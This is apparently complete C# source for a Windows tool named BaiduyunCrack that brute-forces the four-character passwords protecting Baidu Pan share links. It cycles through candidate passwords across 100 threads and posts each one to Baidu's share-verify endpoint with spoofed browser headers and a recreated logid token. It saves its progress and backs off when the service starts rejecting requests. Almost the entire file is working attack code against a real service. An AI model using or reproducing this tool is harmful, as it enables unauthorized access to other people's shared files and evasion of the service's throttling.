using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BaiduyunCrack
{
	public partial class Form1 : Form
	{
		private static bool isFind = false;
		private static bool isHasException = false;
		private static string baiduyunLink = "";
		private static string logid = "";
		private static DateTime startTime = DateTime.Now;
		private static List<string> usedPwdList = new List<string>();
		private static int exceptionCount = 0;

		private static int waitThreadCount = 0;

		private static string path = "";

		private static List<string> allPwdList = new List<string>();
		private static int threadCount = 1;

		private static double waitTimeSeconds = 5;//(单位：秒)
		private static DateTime lastHasExceptionTime = DateTime.Now;
		public Form1()
		{
			InitializeComponent();
			Init();
		}

		void Init()
		{
			lblStartTime.Text = "";
			lblStopTime.Text = "";
			tbxUltimatelyPwd.Text = "";
			lblTotalSeconds.Text = "";
			lblStateStr.Text = "";
			lblExceptionCount.Text = exceptionCount.ToString();
			tbxUltimatelyPwd.Enabled = false;
			//异常情况，远程服务器直接挂掉，分享接口挂掉，404，不怪我
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			baiduyunLink = tbxBaiduyunAddr.Text;
			if (string.IsNullOrWhiteSpace(baiduyunLink))
			{
				tbxBaiduyunAddr.Text = "";
				MessageBox.Show("请填写百度云资源地址");
				tbxBaiduyunAddr.Focus();
				return;
			}
			btnStart.Text = "执行中...";
			btnStart.Enabled = false;
			tbxUltimatelyPwd.Enabled = false;
			tbxBaiduyunAddr.Enabled = false;

			exceptionCount = 0;
			waitThreadCount = 0;
			isFind = false;
			isHasException = false;
			startTime = DateTime.Now;
			lblStartTime.Text = startTime.ToStr();

			logid = getLogid(baiduyunLink);
			threadCount = 100; //线程数
			allPwdList = GetAllPwdList();//所有密码列表生成
			path = Path.Combine(Environment.CurrentDirectory, "jsonfile\\" + baiduyunLink.Split('?')[1].Split('=')[1] + ".txt");

			List<string> restPwdList = new List<string>();

			if (File.Exists(path))
			{
				usedPwdList = FileHelper.Read(path, Encoding.UTF8).DeserializeObject<List<string>>();
				restPwdList = allPwdList.Except(usedPwdList).ToList();
			}
			else
			{
				restPwdList = allPwdList;
			}

			FindIt(restPwdList, threadCount);
		}

		/// <summary>
		/// 检索等待
		/// </summary>
		private void Wait()
		{
			ThreadPool.QueueUserWorkItem(o =>
			{
				waitThreadCount++;
				if (waitThreadCount > 1)
				{
					return;
				}
				while (true)
				{
					Thread.Sleep(1);
					if (isHasException)
					{
						//如果有异常，则执行等待，并等倒计时结束后，继续用剩下未用过的密码进行破解
						var timeSpan = DateTime.Now - lastHasExceptionTime;
						if (timeSpan.TotalSeconds < waitTimeSeconds)
						{
							Thread.Sleep(500);
							var leftSeconds = Convert.ToInt32(waitTimeSeconds - timeSpan.TotalSeconds);
							BeginInvoke(new Action(() =>
							{
								lblStateStr.Text = $"状态：百度接口正处于异常状态，【{leftSeconds}】秒后继续尝试破解！";
								tbxUltimatelyPwd.Text = "";
							}));
							continue;
						}
						//读取文本文件
						var usedPwdListStr = FileHelper.Read(path, Encoding.UTF8).DeserializeObject<List<string>>();
						var leftPwdList = allPwdList.Except(usedPwdListStr).ToList();
						FindIt(leftPwdList, threadCount);
						isHasException = false;
						if (waitTimeSeconds < 500)
						{
							waitTimeSeconds = waitTimeSeconds * 2;
						}
						return;
					}
					else
					{
						Thread.Sleep(500);
					}
				}
			});

		}

		private void FindIt(List<string> pwdlist, int threadCount)
		{
			var group = GetGroupList(pwdlist, threadCount);

			for (int i = 0; i < group.Count(); i++)
			{
				ThreadPool.QueueUserWorkItem(indexObj =>
				{
					var index = (int)indexObj;
					var list = group[index];
					var thePwd = "";
					foreach (var pwd in list)
					{
						Thread.Sleep(1);
						if (isFind)
						{
							return;
						}
						if (isHasException)
						{
							return;
						}
						BeginInvoke(new Action(() =>
						{
							tbxUltimatelyPwd.Text = pwd;
							lblStateStr.Text = $"状态：破解中...";
						}));
						string result = "";
						try
						{
							result = getResult(baiduyunLink, pwd);
						}
						catch (Exception)
						{
							isHasException = true;
							exceptionCount++;
							lastHasExceptionTime = DateTime.Now;
							BeginInvoke(new Action(() =>
							{
								lblExceptionCount.Text = exceptionCount.ToString();
							}));
							waitThreadCount = 0;
							Wait();
							//将用过的pwd存入文件
							try
							{
								WriteUsedPwdToFile(baiduyunLink, usedPwdList);
							}
							catch (Exception)
							{
							}
							return;
						}
						var rObj = result.DeserializeObject<BaiduYunResult>();
						if (rObj.errno == 0)
						{
							//找到了
							isFind = true;
							thePwd = pwd;
							try
							{
								WriteUsedPwdToFile(baiduyunLink, usedPwdList);
							}
							catch (Exception)
							{
							}
							BeginInvoke(new Action(() =>
							{
								var stopTime = DateTime.Now;
								lblStopTime.Text = stopTime.ToStr();
								lblTotalSeconds.Text = (stopTime - startTime).TotalSeconds.ToString("0.00") + " s";
								tbxUltimatelyPwd.Text = thePwd;
								tbxUltimatelyPwd.Enabled = true;
								lblStateStr.Text = $"状态：破解完成！";
								btnStart.Text = "开始";
								btnStart.Enabled = true;
								tbxBaiduyunAddr.Enabled = true;
							}));
							return;
						}
						else
						{
							usedPwdList.Add(pwd);
						}
					}
				}, i);
			}
		}

		private void WriteUsedPwdToFile(string baiduyunLink, List<string> usedPwdList)
		{
			string writeStr = usedPwdList.SerializeObject();
			var dirctoryName = Path.GetDirectoryName(path);
			if (!Directory.Exists(dirctoryName))
			{
				Directory.CreateDirectory(dirctoryName);
			}
			FileHelper.Write(path, writeStr, Encoding.UTF8);
		}

		private List<string> GetAllPwdList()
		{
			List<string> list = new List<string>();
			foreach (var item1 in GetCodes())
			{
				foreach (var item2 in GetCodes())
				{
					foreach (var item3 in GetCodes())
					{
						foreach (var item4 in GetCodes())
						{
							list.Add(string.Join("", item1, item2, item3, item4));
						}
					}
				}
			}
			return list;
		}

		//将list拆分成N份
		List<List<T>> GetGroupList<T>(List<T> list, int pageCount)
		{
			List<List<T>> group = new List<List<T>>();
			var totalCount = list.Count();
			var pageSize = Convert.ToInt32(Math.Ceiling(totalCount * 1.0 / pageCount));//每页数据量
			for (int i = 0; i < pageCount; i++)
			{
				group.Add(list.Skip(i * pageSize).Take(pageSize).ToList());
			}
			return group;
		}

		private string GetNextPwd(string startStr = "", string stopStr = "zzzz")
		{
			string nextPwd = "";
			if (string.IsNullOrWhiteSpace(startStr))
			{
				nextPwd = "0000";
			}
			else
			{
				var reverseStartPwd = startStr.ToArray().Reverse().ToList();
				for (int i = 0; i < reverseStartPwd.Count(); i++)
				{
					if (i < reverseStartPwd.Count() - 1)
					{
						if (IsInCodeRange(reverseStartPwd[i]))
						{
							//可以直接加
							reverseStartPwd[i] = GetAddChar(reverseStartPwd[i]);
							break;
						}
						else
						{

						}
					}
					else
					{

					}
				}
				reverseStartPwd.Reverse();
				nextPwd = string.Join("", reverseStartPwd);
			}
			return nextPwd;

		}

		//字符转ASCII码：
		public static int CharToAscII(char character)
		{
			return new ASCIIEncoding().GetBytes(new char[] { character })[0];
		}

		//ASCII码转字符：

		public static char AscIIToChar(int asciiCode)
		{
			return new ASCIIEncoding().GetString(new byte[] { (byte)asciiCode })[0];
		}

		public static string GetCodes()
		{
			//return "0123456789abcdefghijklmnopqrstuvwxyz";
			return "mrvp";
		}
		/// <summary>
		/// 是否在范围内，左闭右开 [,)
		/// </summary>
		/// <param name="a1"></param>
		/// <returns></returns>
		bool IsInCodeRange(char a1)
		{
			if (GetCodes().IndexOf(a1) < GetCodes().Length - 1)
			{
				return true;
			}
			return false;
		}

		char GetAddChar(char a1)
		{
			return GetCodes()[GetCodes().IndexOf(a1) + 1];
		}

		string getBaiduUId(string url)
		{
			var f = CookieReader.GetCookie(url);
			var a1 = f.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
			Dictionary<string, string> dict = new Dictionary<string, string>();
			foreach (var aItem in a1)
			{
				dict.Add(aItem.Split('=')[0], aItem.Split('=')[1]);
			}
			return dict.FirstOrDefault(m => m.Key == "BAIDUID").Value + "=1";
		}

		public static string SendDataByGET(string Url, string surl, string postDataStr, string formParamStrs, ref CookieContainer cookie)
		{
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url + (postDataStr == "" ? "" : "?") + postDataStr);
			if (cookie.Count == 0)
			{
				request.CookieContainer = new CookieContainer();
				cookie = request.CookieContainer;
			}
			else
			{
				request.CookieContainer = cookie;
			}
			request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
			request.Method = "POST";
			request.KeepAlive = true;
			request.AllowAutoRedirect = true;

			request.Referer = $"https://pan.baidu.com/share/init?surl={surl}";
			request.Accept = "application/json, text/javascript, */*; q=0.01";
			request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
			request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
			request.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
			request.Headers.Add("Cache-Control", "no-cache");
			request.Headers.Add("X-Requested-With", "XMLHttpRequest");
			request.Headers.Add("Origin", "https://pan.baidu.com");
			request.Headers.Add("Pragma", "no-cache");
			request.Host = "pan.baidu.com";
			string reqdata = formParamStrs;
			byte[] buf = System.Text.Encoding.UTF8.GetBytes(reqdata);
			System.IO.Stream s = request.GetRequestStream();
			s.Write(buf, 0, buf.Length);
			s.Close();
			HttpWebResponse response = (HttpWebResponse)request.GetResponse();

			string encd = response.ContentEncoding;

			string htmlCode = "";
			using (System.IO.Stream streamReceive = response.GetResponseStream())
			{
				using (var zipStream = new System.IO.Compression.GZipStream(streamReceive, System.IO.Compression.CompressionMode.Decompress))
				{
					using (StreamReader sr = new System.IO.StreamReader(zipStream, Encoding.UTF8))
					{
						htmlCode = sr.ReadToEnd();
					}
				}
			}

			return htmlCode;
		}


		string getResult(string baiduyunLink, string pwd)
		{
			string surl = baiduyunLink.Split('?')[1].Split('=')[1];
			string postUrl = "https://pan.baidu.com/share/verify";
			string postParamstr = $"{baiduyunLink.Split('?')[1]}&t={getTime()}" +
				$"&bdstoken=null&channel=chunlei&clienttype=0&web=1&app_id=250528&logid={logid}";
			CookieContainer cookies = new CookieContainer();
			//cookies.Add(new Cookie("PANWEB", "1","/", ".pan.baidu.com"));
			//cookies.Add(new Cookie("PSINO", "5","/", ".baidu.com"));
			//cookies.Add(new Cookie("BAIDUID", "B1A24498D8F2EFF1156ECF13806B899C:FG=1", "/", ".baidu.com"));
			//cookies.Add(new Cookie("BIDUPSID", "B1A24498D8F2EFF1156ECF13806B899C", "/", ".baidu.com"));
			//cookies.Add(new Cookie("PSTM", "1514964941", "/", ".baidu.com"));
			var s = SendDataByGET(postUrl, surl, postParamstr, $"pwd={pwd}&vcode=&vcode_str=", ref cookies);
			return s;
		}

		public static string GetContent(string url, string paramStrs)
		{
			Uri uri = new Uri(url);
			try
			{
				HttpWebRequest request = WebRequest.Create(uri) as HttpWebRequest;
				request.Method = "post";
				request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
				request.Headers.Add("Access-Control-Allow-Origin:*");
				string reqdata = paramStrs;
				byte[] buf = System.Text.Encoding.UTF8.GetBytes(reqdata);
				System.IO.Stream s = request.GetRequestStream();
				s.Write(buf, 0, buf.Length);
				s.Close();
				HttpWebResponse res = request.GetResponse() as HttpWebResponse;
				StreamReader sr = new StreamReader(res.GetResponseStream(), System.Text.Encoding.UTF8);
				string html = sr.ReadToEnd();
				return html;
			}
			catch (Exception ex)
			{
				return ex.ToString();
			}
		}

		public string getLogid(string referUrl)
		{
			var baiduUid = getBaiduUId(referUrl);
			return (string)ExecuteScript($"getLogid('{referUrl}')", getjsCode());
		}


		string getTime()
		{
			return (string)ExecuteScript("getTime()", getjsTime());

		}

		/// <summary>
		/// 执行JS
		/// </summary>
		/// <param name="sExpression">参数体</param>
		/// <param name="sCode">JavaScript代码的字符串</param>
		/// <returns></returns>
		private object ExecuteScript(string sExpression, string sCode)
		{
			MSScriptControl.ScriptControl scriptControl = new MSScriptControl.ScriptControl();
			scriptControl.UseSafeSubset = true;
			scriptControl.Language = "JScript";
			scriptControl.AddCode(sCode);
			try
			{
				return scriptControl.Eval(sExpression);
			}
			catch (Exception ex)
			{

			}
			return null;
		}

		string getjsTime()
		{
			return @"
function getTime() {
			return (new Date).getTime()+'';
		}
";
		}


		string getjsCode()
		{
			return @"
		function getLogid(baiduuid) {
			var s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/~！@#￥%……&',
				u = String.fromCharCode,
				f = function (n) {
					if (n.length < 2) {
						var e = n.charCodeAt(0);
						return 128 > e ? n : 2048 > e ? u(192 | e >>> 6) + u(128 | 63 & e) : u(224 | e >>> 12 & 15) + u(128 | e >>> 6 & 63) + u(128 | 63 & e)
					}
					var e = 65536 + 1024 * (n.charCodeAt(0) - 55296) + (n.charCodeAt(1) - 56320);
					return u(240 | e >>> 18 & 7) + u(128 | e >>> 12 & 63) + u(128 | e >>> 6 & 63) + u(128 | 63 & e)
				},
				l = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g,

				d = function (n) {
					return (n + '' + Math.random()).replace(l, f)
				},
				g = function (n) {
					var e = [0, 2, 1][n.length % 3],
						o = n.charCodeAt(0) << 16 | (n.length > 1 ? n.charCodeAt(1) : 0) << 8 | (n.length > 2 ? n.charCodeAt(2) : 0),
						t = [s.charAt(o >>> 18), s.charAt(o >>> 12 & 63), e >= 2 ? '=' : s.charAt(o >>> 6 & 63), e >= 1 ? '=' : s.charAt(63 & o)];
					return t.join('')
				},
				m = function (n) {
					return n.replace(/[\s\S]{1,3}/g, g)
				},
				h = function () {
					return m(d((new Date).getTime()))
				},
				logid = h(String(baiduuid));
			return logid;
		}";
		}

	}

	public class BaiduYunResult
	{
		public int errno { get; set; }
		public string err_msg { get; set; }
		public long request_id { get; set; }
	}
}
